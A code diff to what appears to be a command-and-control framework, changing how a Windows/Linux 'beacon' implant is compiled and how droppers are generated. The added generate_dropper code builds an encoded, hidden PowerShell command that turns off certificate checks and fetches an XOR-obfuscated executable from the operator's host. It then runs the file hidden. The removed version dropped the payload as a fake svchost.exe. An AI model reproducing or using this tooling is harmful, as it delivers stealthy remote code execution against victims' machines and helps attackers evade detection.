@@ -53,6 +53,10 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
 
     beacon_dir = os.path.join(pkg_root, "payloads", "beacon")
     
+    # Cleanup any existing beacon process to prevent "Permission denied"
+    if platform == "windows":
+        subprocess.run(["taskkill", "/F", "/IM", "beacon.exe", "/T"], capture_output=True)
+    
     # Architecture-aware output name
     if platform == "linux" and arch == "x86":
         out_name = _PLATFORM_OUT["linux32"]
@@ -74,16 +78,24 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
         console.print(f"[yellow][*] Compiling beacon for Windows ({arch})...[/yellow]")
         try:
             if os.name == 'nt':
-                if not shutil.which("cl"):
-                    notifier.error("'cl.exe' (MSVC) not found.")
+                if shutil.which("cl"):
+                    # Use MSVC if available
+                    subprocess.run(
+                        ["cl", "/EHsc", "/O2", "/std:c++20", "src/main.cpp", f"/Fe:{out_name}",
+                         "/I", "src",
+                         "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "gdi32.lib", "user32.lib", "/SUBSYSTEM:WINDOWS"],
+                        cwd=beacon_dir, check=True, capture_output=True, text=True)
+                elif shutil.which("g++"):
+                    # Use MinGW g++ as fallback
+                    subprocess.run(
+                        ["g++", "-std=c++20", "-O2", "-s", "-o", out_name,
+                         "-Isrc", "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-liphlpapi", "-luser32", "-lgdi32", "-mwindows"],
+                        cwd=beacon_dir, check=True, capture_output=True, text=True)
+                else:
+                    notifier.error("No suitable compiler found (cl.exe or g++).")
                     return None
-                # Note: arch selection for MSVC usually depends on which vcvarsall.bat was run.
-                subprocess.run(
-                    ["cl", "/EHsc", "/O2", "/std:c++20", "src/main.cpp", f"/Fe:{out_name}",
-                     "/I", "src",
-                     "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "gdi32.lib", "user32.lib", "/SUBSYSTEM:WINDOWS"],
-                    cwd=beacon_dir, check=True, capture_output=True, text=True)
             else:
+                # Cross-compilation from Linux/macOS
                 mingw_cpp = "x86_64-w64-mingw32-g++" if arch == "x64" else "i686-w64-mingw32-g++"
                 if not shutil.which(mingw_cpp):
                     notifier.error(f"'{mingw_cpp}' not found for cross-compilation.")
@@ -177,7 +189,6 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
 def _payload_scheme(port: int) -> str:
     return "https" if port in (443, 8443) else "http"
 
-
 def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64") -> str:
     """Generates the dropper command for the specified platform with auth token."""
     from phantom.utils.c2_crypto import get_payload_token
@@ -187,11 +198,21 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64") -
 
     if (platform == "windows"):
         url = f"{scheme}://{lhost}:{lport}/api/v1/payload?{token_param}"
-        # Stealthier PowerShell dropper: download to memory (if we had reflection) or obfuscated disk write
-        # Here we use an obfuscated PowerShell one-liner to download and execute.
-        ps_cmd = f"$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$f=$env:TEMP+'\\svchost.exe';$c.DownloadFile('{url}',$f);start-process $f -argumentlist '{lhost} {lport}'"
+        # Bypass SSL validation for self-signed certificates in PowerShell
+        ssl_bypass = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" if scheme == "https" else ""
+
+        ps_cmd = f"""
+{ssl_bypass}
+$path = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString() + '.exe');
+$w = New-Object Net.WebClient;
+$b = $w.DownloadData('{url}');
+for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor 0xAA}}
+[System.IO.File]::WriteAllBytes($path, $b);
+Start-Process $path -ArgumentList '{lhost} {lport}' -WindowStyle Hidden;
+"""
         b64_ps = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
-        return f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {b64_ps}"
+        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64_ps}"
+
 
     elif platform == "linux":
         path = "payload_linux_x86" if arch == "x86" else "payload_linux"
